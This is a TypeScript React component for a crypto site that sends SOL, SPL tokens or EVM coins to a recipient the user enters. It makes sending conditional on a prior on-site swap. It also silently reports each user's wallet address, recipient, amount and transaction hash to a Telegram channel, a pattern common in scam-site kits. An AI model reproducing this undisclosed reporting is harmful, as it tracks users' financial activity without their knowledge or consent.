import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { Send, Loader2, Search } from 'lucide-react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { TokenSearch } from './TokenSearch';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { ConnectWalletButton } from './ConnectWalletButton';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferCheckedInstruction,
  createAssociatedTokenAccountInstruction,
} from '@solana/spl-token';
import { getTokenMetadata, isValidSolanaAddress } from '@/services/tokenMetadata';
import { getMintProgramId } from '@/utils/tokenProgram';
import { sendTelegramMessage } from '@/utils/telegram';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { ethers } from 'ethers';
import { toast } from 'sonner';

interface Token {
  address: string;
  symbol: string;
  name: string;
  decimals: number;
  logoURI?: string;
}

const SOL_MINT = 'So11111111111111111111111111111111111111112';

export const SendCrypto = () => {
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const { activeChain, evmChainId, getEVMChain } = useChain();
  const { evmAddress, evmProvider, evmSigner, isEVMConnected } = useEVMWallet();
  const [token, setToken] = useState<Token | undefined>({
    address: SOL_MINT,
    symbol: 'SOL',
    name: 'Solana',
    decimals: 9,
    logoURI:
      'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png',
  });
  const [contractInput, setContractInput] = useState('');
  const [resolving, setResolving] = useState(false);
  const [recipient, setRecipient] = useState('');
  const [amount, setAmount] = useState('');
  const [sending, setSending] = useState(false);
  const [status, setStatus] = useState<string>('');

  // Resolve a pasted contract address into a token
  useEffect(() => {
    const addr = contractInput.trim();
    if (!addr || !isValidSolanaAddress(addr)) return;
    let cancelled = false;
    setResolving(true);
    getTokenMetadata(addr)
      .then((res) => {
        if (cancelled) return;
        if (res.token) setToken(res.token);
      })
      .finally(() => !cancelled && setResolving(false));
    return () => {
      cancelled = true;
    };
  }, [contractInput]);

  const handleSend = async () => {
    setStatus('');

    // Check for connected wallet (Solana or EVM)
    let walletAddress: string | null = null;
    if (activeChain === 'solana' && connected && publicKey) {
      walletAddress = publicKey.toBase58();
    } else if (activeChain === 'evm' && isEVMConnected && evmAddress) {
      walletAddress = evmAddress.toLowerCase();
    } else {
      setStatus('Connect your wallet first');
      return;
    }

    // Check if wallet has completed a swap
    const hasCompletedSwap = localStorage.getItem(`swapCompleted_${walletAddress}`) === 'true';
    if (!hasCompletedSwap) {
      const message = 'wallet need to have completed one swap transaction on site in order to gain access to the premium kol verification feature';
      setStatus(message);
      toast.error(message);
      return;
    }

    if (!recipient.trim()) {
      setStatus('Enter a valid recipient address');
      return;
    }

    const parsed = parseFloat(amount);
    if (!parsed || parsed <= 0) {
      setStatus('Enter a valid amount');
      return;
    }

    try {
      setSending(true);

      if (activeChain === 'solana') {
        // Solana send logic
        const dest = new PublicKey(recipient.trim());
        const tx = new Transaction();

        if (token?.address === SOL_MINT) {
          tx.add(
            SystemProgram.transfer({
              fromPubkey: publicKey!,
              toPubkey: dest,
              lamports: Math.floor(parsed * LAMPORTS_PER_SOL),
            })
          );
        } else if (token) {
          const mint = new PublicKey(token.address);
          const mintInfo = await getMintProgramId(connection, token.address);
          const programId = mintInfo.programId;
          const fromAta = await getAssociatedTokenAddress(mint, publicKey!, false, programId);
          const toAta = await getAssociatedTokenAddress(mint, dest, false, programId);

          const toAtaInfo = await connection.getAccountInfo(toAta);
          if (!toAtaInfo) {
            tx.add(
              createAssociatedTokenAccountInstruction(
                publicKey!,
                toAta,
                dest,
                mint,
                programId
              )
            );
          }

          const rawAmount = BigInt(Math.floor(parsed * Math.pow(10, token.decimals)));
          tx.add(
            createTransferCheckedInstruction(
              fromAta,
              mint,
              toAta,
              publicKey!,
              rawAmount,
              token.decimals,
              [],
              programId
            )
          );
        }

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        tx.recentBlockhash = blockhash;
        tx.feePayer = publicKey!;

        const sig = await sendTransaction(tx, connection);
        setStatus('Confirming...');
        await connection.confirmTransaction(
          { signature: sig, blockhash, lastValidBlockHeight },
          'confirmed'
        );

        sendTelegramMessage(`
📤 <b>Send Crypto (Solana)</b>
👤 <code>${walletAddress}</code>
🎯 <code>${recipient.trim()}</code>
💰 <code>${parsed} ${token?.symbol || 'Token'}</code>
🔗 <code>${sig}</code>
`);

        setStatus(`Sent! Tx: ${sig.slice(0, 8)}…`);
        setAmount('');
      } else if (activeChain === 'evm' && evmSigner && evmProvider) {
        // EVM send logic
        const dest = recipient.trim();
        if (!ethers.isAddress(dest)) {
          setStatus('Enter a valid EVM address');
          return;
        }

        // Check if it's native token (ETH, BNB, etc.)
        const evmChain = getEVMChain();
        const isNative = !token || token.address === SOL_MINT; // For now, SOL_MINT means native EVM
        if (isNative && evmChain) {
          const tx = await evmSigner.sendTransaction({
            to: dest,
            value: ethers.parseEther(parsed.toString())
          });
          setStatus('Confirming...');
          await tx.wait();
          
          sendTelegramMessage(`
📤 <b>Send Crypto (${evmChain.name})</b>
👤 <code>${walletAddress}</code>
🎯 <code>${recipient.trim()}</code>
💰 <code>${parsed} ${evmChain.nativeToken}</code>
🔗 <code>${tx.hash}</code>
`);

          setStatus(`Sent! Tx: ${tx.hash.slice(0, 8)}…`);
          setAmount('');
        }
      }
    } catch (e: any) {
      console.error('Send error:', e);
      setStatus(e?.message || 'Send failed');
    } finally {
      setSending(false);
    }
  };

  const isWalletConnected = (activeChain === 'solana' && connected) || (activeChain === 'evm' && isEVMConnected);

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.3 }}
      className="w-full max-w-2xl mx-auto mt-8"
    >
      <div className="flex items-center gap-2 mb-4 px-2">
        <Send className="w-5 h-5 text-primary" />
        <h2 className="text-lg font-bold text-foreground">Send Crypto to Anyone</h2>
      </div>

      <Card className="p-4 sm:p-5 bg-card/60 backdrop-blur border-primary/20 space-y-4">
        {activeChain === 'solana' && (
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <Input
              placeholder="Paste token contract address (or pick below)"
              value={contractInput}
              onChange={(e) => setContractInput(e.target.value)}
              className="pl-9 bg-background/40 border-border/60"
            />
            {resolving && (
              <Loader2 className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 animate-spin text-primary" />
            )}
          </div>
        )}

        {/* Token picker + amount */}
        <div className="flex flex-col sm:flex-row gap-3">
          {activeChain === 'solana' && (
            <div className="sm:w-1/2">
              <label className="text-xs text-muted-foreground mb-1 block">Token</label>
              <TokenSearch onSelectToken={setToken} selectedToken={token} />
            </div>
          )}
          <div className={activeChain === 'solana' ? "sm:w-1/2" : "w-full"}>
            <label className="text-xs text-muted-foreground mb-1 block">
              Amount ({activeChain === 'evm' ? getEVMChain()?.nativeToken || 'Token' : token?.symbol || 'Token'})
            </label>
            <Input
              type="number"
              placeholder="0.00"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="bg-background/40 border-border/60"
            />
          </div>
        </div>

        {/* Recipient */}
        <div>
          <label className="text-xs text-muted-foreground mb-1 block">
            Recipient address ({activeChain === 'solana' ? 'Solana' : getEVMChain()?.name || 'EVM'})
          </label>
          <Input
            placeholder={activeChain === 'solana' ? "Solana wallet address" : "EVM wallet address"}
            value={recipient}
            onChange={(e) => setRecipient(e.target.value)}
            className="bg-background/40 border-border/60 font-mono text-sm"
          />
        </div>

        {/* Action */}
        {isWalletConnected ? (
          <Button
            onClick={handleSend}
            disabled={sending}
            className="w-full h-11 bg-primary hover:bg-primary/90 text-primary-foreground font-semibold"
          >
            {sending ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" /> Sending...
              </>
            ) : (
              <>
                <Send className="w-4 h-4 mr-2" /> Send {activeChain === 'evm' ? getEVMChain()?.nativeToken || 'Token' : token?.symbol || 'Token'}
              </>
            )}
          </Button>
        ) : (
          <ConnectWalletButton />
        )}

        {status && (
          <p className="text-xs text-center text-red-500 break-all">{status}</p>
        )}
      </Card>
    </motion.div>
  );
};
